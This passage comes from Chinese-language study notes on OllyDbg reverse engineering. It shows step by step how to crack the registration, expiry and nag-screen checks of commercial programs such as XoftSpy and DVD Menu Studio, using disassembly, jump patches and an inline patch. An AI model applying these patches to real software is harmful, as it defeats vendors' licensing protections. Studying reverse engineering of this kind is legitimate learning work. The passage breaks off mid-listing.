ss:[esp+esi+0x8],al\n004046C3  |.  46            |inc esi                                 ;  fjproduc.00430334\n004046C4  |.  83FE 04       |cmp esi,0x4\n004046C7  |.^ 7C E7         \\jl short fjproduc.004046B0;循环4次\n004046C9  |.  807C24 0B 5F  cmp byte ptr ss:[esp+0xB],0x5F\n004046CE  |.  0f94c0        sete al;al=ZF=0\n004046D1  |.  5E            pop esi                                  ;  fjproduc.00430334\n004046D2  |.  83C4 2C       add esp,0x2C\n004046D5  \\.  C3            retn\n```\n\n另一种改法：\n\n```asm\njnz short fjproduc.0040465E\t\t\t=>\t\tjz short fjproduc.0040465E\njl short fjproduc.0040465E\t\t\t=>\t\tjnl short fjproduc.0040465E\nsete al\t\t\t\t\t\t\t\t=>\t\tmov al,1\n```\n\n{% asset_img 实验9.3.png 实验9.3 %}\n\n应该还有第三种改法，按照它的算法前缀为frj开头之类的...好难不会\n\n## 18. 实验十 TechScheduler\n\n{% asset_img 实验10.png 实验10 %}\n\n{% asset_img 实验10.1.png 实验10.1 %}\n\n{% asset_img 实验10.2.png 实验10.2 %}\n\n目标：破解注册。\n\n{% asset_img 实验10.3.png 实验10.3 %}\n\n是32位下的Delphi可执行文件，意味着有很多的函数调用。\n\n右键->中文搜索引擎->智能搜索，搜索`first name`可搜到“Enter a First Name value now...”，往下看看还有“Registration Key accepted!”字样，双击定位到接受注册密钥的汇编代码处。\n\n往上找找到当前的函数入口处，期间可以看到注释窗口很多“first name”, “last name”, “error”之类的，尝试在函数的某个地方下断点，看是否会停到断点处。停到断点处后F8往下执行，直到运行到错误弹框出现，用nop填充。(为什么要用nop填充而不是跟进去？可能是最后是去到了dll领空，我们改不了)保存文件。\n\n重载运行，跟上面实验一样关注修改跳转语句，修改运行到“Registration Key accepted!”即可。\n\n{% asset_img 实验10.4.png 实验10.4 %}\n\n这里我讲得有点空，看多几遍视频就可理解了。[小甲鱼OD使用教程12](https://www.bilibili.com/video/BV1gs411P7A1?p=16) \n\n## 19. 实验十一 XoftSpy\n\n{% asset_img 实验11.png 实验11 %}\n\n目标：实现注册。\n\n{% asset_img 实验11.1.png 实验11.1 %}\n\n通常从程序的对话框里面获取字符串，一般都是调用API函数`GetWindowText`。\n\n方法一：OD载入程序，右键->查找->所有模块间的调用，直接键盘输入查找`GetWindowText`。选中右键->在每个调用到GetWindowTextA上设置断点。可以Alt+B查看在哪里设置了断点，有几个断点。\n\n方法二：Ctrl+N，直接键盘输入查找`GetWindowText`。选中右键->在每个参考上设置断点。\n\n运行程序，发现程序还没完全打开时就停在了断点处，肯定不是我们想去到的地方。我们需要的是在输入Key点OK后的那个断点。\n\nF8走走，再F9运行重复几次，发现回到那个断点处3次，应该是每次获取一个框的内容。之后一路F8，直到在信息窗口或在寄存器窗口或在堆栈窗口看到刚才我们输入的东西时要格外留心，再看到条件跳转指令要注意跳到哪里。注释窗口出现关键字符串“Congratulations!”，在004174E3地址有个箭头，可以在信息窗口看到跳转来自00417465和0041749C。选中信息窗口的“跳转来自”右键，分别去到两个地址处。发现它们调用的是同一个函数，也就是算法实现是一样的。\n\n```asm\n0041745E   .  E8 2D020000   call XoftSpy.00417690                    ;  很有可能是关键函数\n00417463   .  84C0          test al,al\n00417465   .  75 7C         jnz short XoftSpy.004174E3               ;  实现跳转\n00417467   .  51            push ecx\n00417468   .  8D5424 14     lea edx,dword ptr ss:[esp+0x14]\n0041746C   .  8BCC          mov ecx,esp\n0041746E   .  896424 20     mov dword ptr ss:[esp+0x20],esp\n00417472   .  52            push edx\n00417473   .  E8 9D6A0400   call XoftSpy.0045DF15\n00417478   .  51            push ecx\n00417479   .  8D4424 1C     lea eax,dword ptr ss:[esp+0x1C]\n0041747D   .  8BCC          mov ecx,esp\n0041747F   .  896424 20     mov dword ptr ss:[esp+0x20],esp\n00417483   .  50            push eax\n00417484   .  C64424 34 03  mov byte ptr ss:[esp+0x34],0x3\n00417489   .  E8 876A0400   call XoftSpy.0045DF15\n0041748E   .  8BCE          mov ecx,esi\n00417490   .  C64424 30 01  mov byte ptr ss:[esp+0x30],0x1\n00417495   .  E8 F6010000   call XoftSpy.00417690                    ;  很有可能是关键函数\n0041749A   .  84C0          test al,al\n0041749C      75 45         jnz short XoftSpy.004174E3               ;  实现跳转\n0041749E   .  6A 00         push 0x0\n004174A0   .  68 04544800   push XoftSpy.00485404                    ;  ASCII \"XoftSpy\"\n004174A5   .  68 C4684800   push XoftSpy.004868C4                    ;  ASCII \"Invalid code.\"\n004174AA   .  8BCE          mov ecx,esi\n004174AC   .  E8 664F0400   call XoftSpy.0045C417\n004174B1   .  68 48FA4800   push XoftSpy.0048FA48\n004174B6   .  8BCD          mov ecx,ebp\n004174B8   .  E8 206E0400   call XoftSpy.0045E2DD\n004174BD   .  68 48FA4800   push XoftSpy.0048FA48\n004174C2   .  8BCF          mov ecx,edi\n004174C4   .  E8 146E0400   call XoftSpy.0045E2DD\n004174C9   .  68 48FA4800   push XoftSpy.0048FA48\n004174CE   .  8BCB          mov ecx,ebx\n004174D0   .  E8 086E0400   call XoftSpy.0045E2DD\n004174D5   .  6A 00         push 0x0\n004174D7   .  8BCE          mov ecx,esi\n004174D9   .  E8 03590400   call XoftSpy.0045CDE1\n004174DE   .  E9 9D000000   jmp XoftSpy.00417580\n004174E3   >  57            push edi\n004174E4   .  55            push ebp\n004174E5   .  E8 769D0100   call XoftSpy.00431260\n004174EA   .  83C4 08       add esp,0x8\n004174ED   .  8BCE          mov ecx,esi\n004174EF   .  6A 00         push 0x0\n004174F1   .  68 04544800   push XoftSpy.00485404                    ;  ASCII \"XoftSpy\"\n004174F6   .  68 98684800   push XoftSpy.00486898                    ;  ASCII \"Congratulations! successfully registered\"\n004174FB   .  E8 174F0400   call XoftSpy.0045C417\n```\n\n在00417465地址处下断点跟进。粗略看一下，发现函数有两个返回。一个是要al=1，另一个是要al=0，通常程序都是1表示已注册，0表示未注册。\n\n```asm\n00417894  |.  E8 07690400   call XoftSpy.0045E1A0\n00417899  |.  5F            pop edi                                  ;  XoftSpy.00417463\n0041789A  |.  5E            pop esi                                  ;  XoftSpy.00417463\n0041789B  |.  B0 01         mov al,0x1\n0041789D  |.  5B            pop ebx                                  ;  XoftSpy.00417463\n0041789E  |.  8B4C24 1C     mov ecx,dword ptr ss:[esp+0x1C]\n004178A2  |.  64:890D 00000>mov dword ptr fs:[0],ecx\n004178A9  |.  83C4 28       add esp,0x28\n004178AC  |.  C2 0800       retn 0x8\n```\n\n```asm\n0041790F  |.  E8 8C680400   call XoftSpy.0045E1A0\n00417914  |.  8B4C24 28     mov ecx,dword ptr ss:[esp+0x28]\n00417918  |.  5F            pop edi                                  ;  XoftSpy.00417463\n00417919  |.  5E            pop esi                                  ;  XoftSpy.00417463\n0041791A  |.  32C0          xor al,al\n0041791C  |.  5B            pop ebx                                  ;  XoftSpy.00417463\n0041791D  |.  64:890D 00000>mov dword ptr fs:[0],ecx\n00417924  |.  83C4 28       add esp,0x28\n00417927  \\.  C2 0800       retn 0x8\n```\n\n往上找找跳转指令\n\n```asm\n00417800  |. /0F85 A9000000 jnz XoftSpy.004178AF\n00417806  |. |3BFA          cmp edi,edx\n00417808  |. |0F85 A1000000 jnz XoftSpy.004178AF\n0041780E  |. |3BD8          cmp ebx,eax\n00417810  |. |0F85 99000000 jnz XoftSpy.004178AF\n00417816  |. |8B4424 20     mov eax,dword ptr ss:[esp+0x20]\n0041781A  |. |B9 0A000000   mov ecx,0xA\n0041781F  |. |99            cdq\n00417820  |. |F7F9          idiv ecx\n00417822  |. |8B4424 24     mov eax,dword ptr ss:[esp+0x24]\n00417826  |. |BE 0A000000   mov esi,0xA\n0041782B  |. |8BCA          mov ecx,edx\n0041782D  |. |99            cdq\n0041782E  |. |F7FE          idiv esi\n00417830  |. |3BD1          cmp edx,ecx\n00417832  |. |75 7B         jnz short XoftSpy.004178AF               ;  不能实现\n```\n\n将这一连串的跳转指令全都nop掉试试，弹窗注册成功。\n\n{% asset_img 实验13.4.png 实验13.4 %}\n\n但它还是说还没有注册。\n\n{% asset_img 实验13.3.png 实验13.3 %}\n\n那查找一下字符串，右键->中文搜索引擎->智能搜索，找到字符串所在的汇编代码处。在所在函数的入口点下断点。重载运行，在界面按下“About”时停在了断点处，F8往下执行。\n\n```asm\n00401492   .  E8 093C0300   call XoftSpy1.004350A0\n00401497   .  84C0          test al,al\n00401499   .  74 12         je short XoftSpy1.004014AD;不能跳，即al不能等于0\n0040149B   .  68 C4514800   push XoftSpy1.004851C4                   ;  This license of XoftSpy has been registered\n004014A0   .  8D4C24 08     lea ecx,dword ptr ss:[esp+0x8]\n004014A4   .  E8 34CE0500   call XoftSpy1.0045E2DD\n004014A9   .  6A 00         push 0x0\n004014AB   .  EB 10         jmp short XoftSpy1.004014BD\n004014AD   >  68 94514800   push XoftSpy1.00485194                   ;  This XoftSpy license has not been registered\n004014B2   .  8D4C24 08     lea ecx,dword ptr ss:[esp+0x8]\n004014B6   .  E8 22CE0500   call XoftSpy1.0045E2DD\n```\n\n在00401492处下断点跟进，粗略看一下发现只有一个返回点。在返回点附近格外关注al的值。由于al的值是bl赋予的，所以再往上看就要关注bl的值。\n\n```asm\n00435219  |. /75 3A         jnz short XoftSpy1.00435255              ;  跳转\n0043521B  |. |51            push ecx\n0043521C  |. |8D5424 14     lea edx,dword ptr ss:[esp+0x14]\n00435220  |. |8BCC          mov ecx,esp\n00435222  |. |896424 24     mov dword ptr ss:[esp+0x24],esp\n00435226  |. |52            push edx\n00435227  |. |E8 E98C0200   call XoftSpy1.0045DF15\n0043522C  |. |51            push ecx\n0043522D  |. |8D4424 1C     lea eax,dword ptr ss:[esp+0x1C]\n00435231  |. |8BCC          mov ecx,esp\n00435233  |. |896424 24     mov dword ptr ss:[esp+0x24],esp\n00435237  |. |50            push eax\n00435238  |. |C64424 38 07  mov byte ptr ss:[esp+0x38],0x7\n0043523D  |. |E8 D38C0200   call XoftSpy1.0045DF15\n00435242  |. |8BCE          mov ecx,esi\n00435244  |. |885C24 34     mov byte ptr ss:[esp+0x34],bl\n00435248  |. |E8 63000000   call XoftSpy1.004352B0\n0043524D  |. |84C0          test al,al\n0043524F  |. |75 04         jnz short XoftSpy1.00435255\n00435251  |. |32DB          xor bl,bl;bl=0\n00435253  |. |EB 02         jmp short XoftSpy1.00435257\n00435255  |> \\B3 01         mov bl,0x1;bl=1\n00435257  |>  8D4C24 10     lea ecx,dword ptr ss:[esp+0x10]\n0043525B  |.  C64424 2C 04  mov byte ptr ss:[esp+0x2C],0x4\n00435260  |.  E8 3B8F0200   call XoftSpy1.0045E1A0\n00435265  |.  8D4C24 14     lea ecx,dword ptr ss:[esp+0x14]\n00435269  |.  C64424 2C 01  mov byte ptr ss:[esp+0x2C],0x1\n0043526E  |.  E8 2D8F0200   call XoftSpy1.0045E1A0\n00435273  |.  8D4C24 08     lea ecx,dword ptr ss:[esp+0x8]\n00435277  |.  C64424 2C 00  mov byte ptr ss:[esp+0x2C],0x0\n0043527C  |.  E8 1F8F0200   call XoftSpy1.0045E1A0\n00435281  |.  8D4C24 0C     lea ecx,dword ptr ss:[esp+0xC]\n00435285  |.  C74424 2C FFF>mov dword ptr ss:[esp+0x2C],-0x1\n0043528D  |.  E8 0E8F0200   call XoftSpy1.0045E1A0\n00435292  |.  8B4C24 24     mov ecx,dword ptr ss:[esp+0x24]\n00435296  |.  8AC3          mov al,bl\n00435298  |.  5E            pop esi                                  ;  0019BFFC\n00435299  |.  64:890D 00000>mov dword ptr fs:[0],ecx\n004352A0  |.  5B            pop ebx                                  ;  0019BFFC\n004352A1  |.  83C4 28       add esp,0x28\n004352A4  \\.  C3            retn\n```\n\n这个程序有很多修改的方法\n\n```asm\n方法一\n00435296  |.  8AC3          mov al,bl\t\t=>\t\tmov al,1\n\n方法二\n00435219  |. /75 3A         jnz short XoftSpy1.00435255 => jmp short XoftSpy1.00435255\n\n方法三\n0043524F  |. |75 04         jnz short XoftSpy1.00435255\t=> jmp short XoftSpy1.00435255\n```\n\n以上三种方法都能成功注册，也没有了注册按钮，说明程序成功破解。\n\n{% asset_img 实验13.5.png 实验13.5 %}\n\n所以在这个程序中，搜索API函数的方法是错误的，是程序发明者挖的坑，故意让我们跳进去。而搜索字符串才能破解成功。当程序发明者有了逆向意识，不想让我们破解程序，就会制造很多坑让我们踩，这时搜索API函数和字符串其实都会让我们踩坑，最好的办法就是查看调用堆栈。\n\n### 19.1 常用的定位方法\n\n- 查找字符串(11.1)\n\n- 查找API函数(破解常用API函数大全.chm)\n\n## 20. Inline patch(内嵌补丁)\n\n内嵌补丁在加壳软件的破解上用得比较多，但不是加壳的也可以用。内嵌补丁指在程序文件中把补丁代码写入文件里达到破解的目的。\n\n## 21. 实验十二 DVD menu studio\n\n{% asset_img 实验12.png 实验12 %}\n\n目标：破解过期程序。\n\n由于这个程序还有30天可用，把时间调到未来再打开就可以过期了。\n\n{% asset_img 实验12.1.png 实验12.1 %}\n\n把时间调回去却还是过期了，说明可能在某个注册表或某个文件记录它是否过期的信息。\n\n查了一下壳，是32位下由C++编译的可执行文件。\n\nF3载入OD运行，在程序界面点击`Enter Reg Code`注册。随便输入弹窗错误提示，点确定后，回到OD看还是没有去到retn指令。(之前的程序都会去到retn指令退出函数)\n\n{% asset_img 实验12.2.png 实验12.2 %}\n\n这是因为进入了循环，就是用户可以在这注册窗口输入无数次，不用再次点击`Enter Reg Code`再输入注册序列号。这个程序用的是`SetTimer`和`KillTimer`设置类似于C语言switch语句的循环。\n\n输入好序列号后，先别按ok。回到OD按下Ctrl+N查找API函数`KillTimer`，选中右键->在每个参考上设置断点。再按ok，发现停在了某个`KillTimer`断点处。(严格按照这个步骤来，不然会停在别的`KillTimer`处)\n\n我们停在了4DC1A7地址，在注释窗口看到了很多有用的信息。想要注册成功就必须走到4DC1D4地址处。\n\n```asm\n004DC1A2   .  8B57 1C       mov edx,dword ptr ds:[edi+0x1C]          ;  Case 3 of switch 004DBDA4\n004DC1A5   .  50            push eax                                 ; /TimerID = 0x3\n004DC1A6   .  52            push edx                                 ; |hWnd = 000406E8 ('DVD Menu Studio - [Untitled]',class='Afx:400000:8:10003:0:2e00151')\n004DC1A7   .  FF15 B4575E00 call dword ptr ds:[<&USER32.KillTimer>]  ; \\KillTimer\n004DC1AD   .  6A 00         push 0x0\n004DC1AF   .  6A 00         push 0x0\n004DC1B1   .  68 5C666400   push DVDMenuS.0064665C                   ;  The registration code seems to be not valid.\\nPlease check if you didn't made any mistake.\n004DC1B6   .  E8 919D0D00   call DVDMenuS.005B5F4C\n004DC1BB   .  E9 B7000000   jmp DVDMenuS.004DC277\n004DC1C0   >  83F8 04       cmp eax,0x4\n;从信息窗口可知跳转来自004DC1A0，右键->转到jnz来自004DC1A0就会跳到004DC1A0地址\n004DC1C3   .  75 1E         jnz short DVDMenuS.004DC1E3;不能跳，即eax=4\n004DC1C5   .  50            push eax                                 ; /TimerID = 0x3; Case 4 of switch 004DBDA4\n004DC1C6   .  8B47 1C       mov eax,dword ptr ds:[edi+0x1C]          ; |\n004DC1C9   .  50            push eax                                 ; |hWnd = 00000003\n004DC1CA   .  FF15 B4575E00 call dword ptr ds:[<&USER32.KillTimer>]  ; \\KillTimer\n004DC1D0   .  6A 00         push 0x0\n004DC1D2   .  6A 00         push 0x0\n004DC1D4   .  68 FC656400   push DVDMenuS.006465FC                   ;  Thank you for your support!\\nPlease Exit the Software and start it again to validate the code.\n004DC1D9   .  E8 6E9D0D00   call DVDMenuS.005B5F4C\n004DC1DE   .  E9 94000000   jmp DVDMenuS.004DC277\n004DC1E3   >  83F8 05       cmp eax,0x5\n004DC1E6   .  75 15         jnz short DVDMenuS.004DC1FD\n```\n\n现在就往上翻查看哪个跳转可以跳过case3去到case4。一直跟踪cmp和jnz语句去到switch语句开头。\n\n```asm\n004DBDA4   .  83F8 01       cmp eax,0x1                              ;  Switch (cases 1..B)\n```\n\n在4DBD80和4DBDA4各下断点，运行一下。\n\n```asm\n004DBD80   .  55            push ebp\n004DBD81   .  8BEC          mov ebp,esp\n004DBD83   .  6A FF         push -0x1\n004DBD85   .  68 17B85D00   push DVDMenuS.005DB817                   ;  SE 处理程序安装\n004DBD8A   .  64:A1 0000000>mov eax,dword ptr fs:[0]\n004DBD90   .  50            push eax\n004DBD91   .  64:8925 00000>mov dword ptr fs:[0],esp\n004DBD98   .  81EC 68010000 sub esp,0x168\n004DBD9E   .  8B45 08       mov eax,dword ptr ss:[ebp+0x8];在判断前最后一个给eax赋值的指令\n004DBDA1   .  53            push ebx                                 ;  DVDMenuS.004DBD80\n004DBDA2   .  56            push esi\n004DBDA3   .  57            push edi\n004DBDA4   .  83F8 01       cmp eax,0x1                              ;  Switch (cases 1..B)\n```\n\n那么能改成如下指令吗？不行。\n\n```asm\nmov eax,dword ptr ss:[ebp+0x8]\t=>\tmov eax,4\n```\n\n因为`mov eax,dword ptr ss:[ebp+0x8]`指令占3个字节，而`mov eax,4`占5个字节，会将后面的指令覆盖，可能会出现奇奇怪怪的问题。\n\n方法一：因为4只需一个字节(8bit)就可存放，所以修改al即可。这条指令占2个字节，所以不用担心后面指令被覆盖的问题。\n\n```asm\nmov eax,dword ptr ss:[ebp+0x8]\t=>\tmov al,4\n```\n\n保存文件，就可正常运行，也没有了NAG窗口。为了好看，再将未注册字样用11.1的第2、3种方法(第1种不行)修改成注册即可。\n\n{% asset_img 实验12.3.png 实验12.3 %}\n\n方法二：内嵌补丁\n\n一个程序在内存中需要对齐，所以会出现很多空白处。一般在汇编代码的末尾。\n\n```asm\n005E47C0      00            db 00\n005E47C1      00            db 00\n005E47C2      00            db 00\n005E47C3      00            db 00\n005E47C4      00            db 00\n005E47C5      00            db 00\n005E47C6      00            db 00\n005E47C7      00            db 00\n005E47C8      00            db 00\n005E47C9      00            db 00\n005E47CA      00            db 00\n005E47CB      00            db 00\n005E47CC      00            db 00\n005E47CD      00            db 00\n005E47CE      00            db 00\n005E47CF      00            db 00\n```\n\n我们可以利用这些空白处写入修改指令，在需要这些修改指令的地方修改成无条件跳转指令即可。\n\n这个程序要在004DBD9E地址处修改成跳转指令，去到005E47C0处。由于jmp指令需要5个字节，所以先去空白代码处放置好我们要修改的指令(要修改的mov指令和复制004DBD9E地址后面两条指令)。\n\n```asm\n005E47C0      B8 04000000   mov eax,0x4\n```\n\n选中004DBD9E地址后面两条指令右键->二进制->二进制复制，复制到5E47C0后面。需要两个字节就选中两个字节粘贴。\n\n```asm\n004DBDA1   .  53            push ebx                                 ;  DVDMenuS.004DBD80\n004DBDA2   .  56            push esi\n```\n\n回到004DBD9E处修改成无条件跳转指令，下一条指令的地址为004DBDA3。\n\n```asm\nmov eax,dword ptr ss:[ebp+0x8]\t=>\tjmp 005E47C0\n```\n\n```asm\n004DBD9E     /E9 1D8A1000   jmp DVDMenuS.005E47C0\n004DBDA3   . |57            push edi                                 ;  DVDMenuS.<ModuleEntryPoint>\n```\n\n去到空白代码处再加一条jmp指令回到004DBDA3地址处。\n\n```asm\n005E47C0      B8 04000000   mov eax,0x4\n005E47C5      53            push ebx\n005E47C6      56            push esi                                 ;  DVDMenuS.<ModuleEntryPoint>\n005E47C7    ^ E9 D775EFFF   jmp DVDMenuS.004DBDA3\n```\n\n保存所有修改，试运行，发现一直弹出注册成功弹窗。\n\n{% asset_img 实验12.4.png 实验12.4 %}\n\n将新程序载入OD，在005E47C0处下个断点。F9运行，F8一步步查看代码运行情况，发现一直在switch里循环。\n\n如果每个case都跳转(到case4处将ZF改变)，直到4DC241处停下。看到注释窗口的“ResetToolbars”和“Settings”——循环结束的标志，我们要经过那里，所以4DC244的跳转不让它实现(将ZF改变)，也就是eax要等于0xB，才能结束循环。\n\n```asm\n004DC241   > \\83F8 0B       cmp eax,0xB\n004DC244   .  75 31         jnz short DVDMenuS.004DC277\n004DC246   .  50            push eax                                 ; /TimerID = 0x4; Case B of switch 004DBDA4\n004DC247   .  8B47 1C       mov eax,dword ptr ds:[edi+0x1C]          ; |\n004DC24A   .  50            push eax                                 ; |hWnd = 00000004\n004DC24B   .  FF15 B4575E00 call dword ptr ds:[<&USER32.KillTimer>]  ; \\KillTimer\n004DC251   .  E8 F3570E00   call DVDMenuS.005C1A49\n004DC256   .  8B40 04       mov eax,dword ptr ds:[eax+0x4]\n004DC259   .  6A 00         push 0x0\n004DC25B   .  68 B03C6400   push DVDMenuS.00643CB0                   ;  ASCII \"ResetToolbars\"\n004DC260   .  68 1CF16300   push DVDMenuS.0063F11C                   ;  ASCII \"Settings\"\n004DC265   .  8BC8          mov ecx,eax\n004DC267   .  E8 255C0E00   call DVDMenuS.005C1E91\n004DC26C   .  85C0          test eax,eax\n004DC26E   .  74 07         je short DVDMenuS.004DC277\n004DC270   .  8BCF          mov ecx,edi\n004DC272   .  E8 99190000   call DVDMenuS.004DDC10\n004DC277   >  8BCF          mov ecx,edi                              ;  Default case of switch 004DBDA4\n004DC279   .  E8 51040D00   call DVDMenuS.005AC6CF\n004DC27E   .  8B4D F4       mov ecx,dword ptr ss:[ebp-0xC]\n004DC281   .  5F            pop edi                                  ;  024F8688\n004DC282   .  5E            pop esi                                  ;  024F8688\n004DC283   .  5B            pop ebx                                  ;  024F8688\n004DC284   .  64:890D 00000>mov dword ptr fs:[0],ecx\n004DC28B   .  8BE5          mov esp,ebp\n004DC28D   .  5D            pop ebp                                  ;  024F8688\n004DC28E   .  C2 0400       retn 0x4\n```\n\n又要等于4又要0xB怎么可能呢？从4到0xB之间又没有别的函数能改变eax的值，那干脆直接让eax=0xB。因为这是个验证序列号是否正确的函数，如果不正确会一直循环让你填写序列号，就算正确也会一直提示你序列号正确，不如直接退出函数，跳出验证过程。\n\n```asm\n005E47C0      B8 04000000   mov eax,0xB\n005E47C5      53            push ebx\n005E47C6      56            push esi                                 ;  DVDMenuS.<ModuleEntryPoint>\n005E47C7    ^ E9 D775EFFF   jmp DVDMenuS.004DBDA3\n```\n\n保存文件，运行成功。\n\n那方法一那样的修改为什么就不会执行循环呢？载入用方法一修改的程序，发现它在case等于4时也跳转，但它也绕过了“ResetToolbars”和“Settings”，直接跳到4DC277地址，最后返回。因为没有循环所以也可以不用循环结束标志。\n\n```asm\n004DBD9E   .  8B45 08       mov al,4;eax=0019fc04\n004DC279   .  E8 51040D00   call DVDMenuS.005AC6CF;eax=0\n```\n\n而方法二\n\n```asm\n005E47C0      B8 04000000   mov eax,0x4;eax=00000004\n004DC1C9   .  50            push eax;eax=00160842\n004DC1D0   .  6A 00         push 0x0;eax=00000000\n004DC1D9   .  E8 6E9D0D00   call DVDMenuS.005B5F4C;按F8还是会步入函数\n```\n\nF8：单步步过到下一条指令，如果当前命令是一个函数，则一次执行完这个函数(除非这个函数内部包含断点或发生了异常)。\n\n4dc1d9->5e47c0->进入switch语句->4dc1d9一直循环，所以其实是不能进入case4里面的，因为一进去就不停循环，并且去不了循环结束的标志处。哪里能去到循环结束处？当eax=0xB时。\n\n方法三：调用堆栈\n\n我们发现程序是打开界面再弹出NAG窗口，那直接去掉NAG窗口是不是可以用了呢？\n\nF9运行程序，程序弹出过期NAG窗口，F12暂停，点击K图标查看堆栈。\n\n```asm\n地址       堆栈       函数过程 / 参数                       调用来自                      \t结构\n0019F9B0   74EF8085   win32u.NtUserGetMessage               user32.74EF807F               0019F9EC\n0019F9F0   005B044F   user32.GetMessageA                    DVDMenuS.005B0449             0019F9EC\n0019F9F4   00662858     pMsg = DVDMenuS.00662858\n0019F9F8   00000000     hWnd = NULL\n0019F9FC   00000000     MsgFilterMin = 0x0\n0019FA00   00000000     MsgFilterMax = 0x0\n0019FA0C   005AF0A2   包含DVDMenuS.005B044F                   DVDMenuS.005AF09F\n0019FA30   005ABF2E   DVDMenuS.005AEFC8                     DVDMenuS.005ABF29\n0019FA6C   004DC0D6   ? DVDMenuS.005ABE4D                   DVDMenuS.004DC0D1\n```\n\n因为进入到界面没有进行任何操作，很有可能最后一个就是调用NAG弹窗(不是再倒着往上找)。\n\n双击去到汇编代码处，给它下个断点，重载运行。主界面出来了，但NAG没有出现。所以005ABE4D地址很有可能就是我们要去除的NAG弹窗。F8单步步过断点，发现走不了，原来是NAG窗口出现了，在NAG窗口点exit后，OD执行到下一条指令。可以确定005ABE4D就是调用了NAG窗口。再点运行就退出程序了。\n\n在调用了这个函数的父函数入口处设置断点，也就是004DBD80处下断点。Ctrl+F2重载，F9运行，程序停在4DBD80处，一路F8，遇到第一个jnz跳转未实现，第二个jnz跳转实现，再F9运行，发现又去到了4DBD80处而不是到达NAG窗口，一路F8，这时遇到第一个jnz跳转实现，跳过了刚才第二个jnz，F8去到了NAG窗口处。后面的事情我们都知道啦，不知道给我看上一段话！所以在NAG窗口创建过程中，调用NAG函数的父函数被执行了两次。\n\n```asm\n004DBD80   .  55            push ebp\n004DBD81   .  8BEC          mov ebp,esp\n004DBD83   .  6A FF         push -0x1\n004DBD85   .  68 17B85D00   push DVDMenuS.005DB817                   ;  SE 处理程序安装\n004DBD8A   .  64:A1 0000000>mov eax,dword ptr fs:[0]\n004DBD90   .  50            push eax\n004DBD91   .  64:8925 00000>mov dword ptr fs:[0],esp\n004DBD98   .  81EC 68010000 sub esp,0x168\n004DBD9E      8B45 08       mov eax,dword ptr ss:[ebp+0x8]\n004DBDA1      53            push ebx                                 ;  DVDMenuS.004DBD80\n004DBDA2      56            push esi\n004DBDA3   .  57            push edi\n004DBDA4   .  83F8 01       cmp eax,0x1                              ;  Switch (cases 1..B)\n004DBDA7   .  8BF9          mov edi,ecx\n004DBDA9   .  75 53         jnz short DVDMenuS.004DBDFE;第一次不跳转，第二次跳转\n004DBDAB   .  50            push eax                                 ; /TimerID = 0x1; Case 1 of switch 004DBDA4\n004DBDAC   .  8B47 1C       mov eax,dword ptr ds:[edi+0x1C]          ; |DVDMenuS.00400564\n004DBDAF   .  50            push eax                                 ; |hWnd = 00000001\n004DBDB0   .  FF15 B4575E00 call dword ptr ds:[<&USER32.KillTimer>]  ; \\KillTimer\n004DBDB6   .  E8 8E5C0E00   call DVDMenuS.005C1A49\n004DBDBB   .  8B40 04       mov eax,dword ptr ds:[eax+0x4]\n004DBDBE   .  83B8 64010000>cmp dword ptr ds:[eax+0x164],0x1\n004DBDC5   .  75 1F         jnz short DVDMenuS.004DBDE6;第一次跳转，第二次被跳过\n```\n\n第二次运行状态\n\n```asm\n004DBDFE   > \\83F8 07       cmp eax,0x7\n004DBE01   .  0F85 42020000 jnz DVDMenuS.004DC049;跳转，eax=2\n```\n\n```asm\n004DC049   > \\83F8 02       cmp eax,0x2\n004DC04C   .  0F85 4B010000 jnz DVDMenuS.004DC19D;不跳转\n...\n004DC0D1   .  E8 77FD0C00   call DVDMenuS.005ABE4D;NAG窗口\n```\n\n那怎么修改才能去除NAG窗口呢？因为调用NAG窗口需要执行两次父函数，而第二个jnz跳转实现后经过一系列指令又回到了父函数。那可不可以修改第一个jnz跳转实现，绕过第二个jnz，避免第二次回到父函数呢？\n\n第一次状态，将第一个jnz的ZF改变\n\n```asm\n004DBDFE   > \\83F8 07       cmp eax,0x7\n004DBE01   .  0F85 42020000 jnz DVDMenuS.004DC049;跳转，eax=1\n```\n\n```asm\n004DC049   > \\83F8 02       cmp eax,0x2\n004DC04C   .  0F85 4B010000 jnz DVDMenuS.004DC19D;跳转，eax=1\n```\n\n```asm\n004DC19D   > \\83F8 03       cmp eax,0x3\n004DC1A0   .  75 1E         jnz short DVDMenuS.004DC1C0;跳转\n```\n\n```asm\n004DC1C0   > \\83F8 04       cmp eax,0x4\n004DC1C3   .  75 1E         jnz short DVDMenuS.004DC1E3;跳转\n```\n\n```asm\n004DC1E3   > \\83F8 05       cmp eax,0x5\n004DC1E6   .  75 15         jnz short DVDMenuS.004DC1FD;跳转\n```\n\n```asm\n004DC1FD   > \\83F8 06       cmp eax,0x6\n004DC200   .  75 0D         jnz short DVDMenuS.004DC20F;跳转\n```\n\n```asm\n004DC20F   > \\83F8 0A       cmp eax,0xA\n004DC212   .  75 2D         jnz short DVDMenuS.004DC241;跳转\n```\n\n```asm\n004DC241   > \\83F8 0B       cmp eax,0xB\n004DC244   .  75 31         jnz short DVDMenuS.004DC277;跳转\n```\n\n```asm\n004DC277   > \\8BCF          mov ecx,edi                              ;  Default case of switch 004DBDA4\n004DC279   .  E8 51040D00   call DVDMenuS.005AC6CF\n004DC27E   .  8B4D F4       mov ecx,dword ptr ss:[ebp-0xC]\n004DC281   .  5F            pop edi                                  ;  025D8688\n004DC282   .  5E            pop esi                                  ;  025D8688\n004DC283   .  5B            pop ebx                                  ;  025D8688\n004DC284   .  64:890D 00000>mov dword ptr fs:[0],ecx\n004DC28B   .  8BE5          mov esp,ebp\n004DC28D   .  5D            pop ebp                                  ;  025D8688\n004DC28E   .  C2 0400       retn 0x4\n```\n\n一直循环到父函数开头。即如果修改第一个jnz跳转实现，父函数会形成死循环，不仅不能避免第二次回到父函数还有第三次第N次回到父函数。\n\n那修改第二个jnz为跳转未实现，又会怎样呢？\n\n第一次状态\n\n```asm\n004DBDC5   . /75 1F         jnz short DVDMenuS.004DBDE6;第二个jnz\n004DBDC7   . |8BCF          mov ecx,edi\n004DBDC9   . |E8 621C0000   call DVDMenuS.004DDA30\n004DBDCE   . |8B4F 1C       mov ecx,dword ptr ds:[edi+0x1C]\n004DBDD1   . |6A 00         push 0x0                                 ; /Timerproc = NULL\n004DBDD3   . |68 C8000000   push 0xC8                                ; |Timeout = 200. ms\n004DBDD8   . |6A 07         push 0x7                                 ; |TimerID = 0x7\n004DBDDA   . |51            push ecx                                 ; |hWnd = 0019FBE4\n004DBDDB   . |FF15 B8575E00 call dword ptr ds:[<&USER32.SetTimer>]   ; \\SetTimer\n004DBDE1   . |E9 91040000   jmp 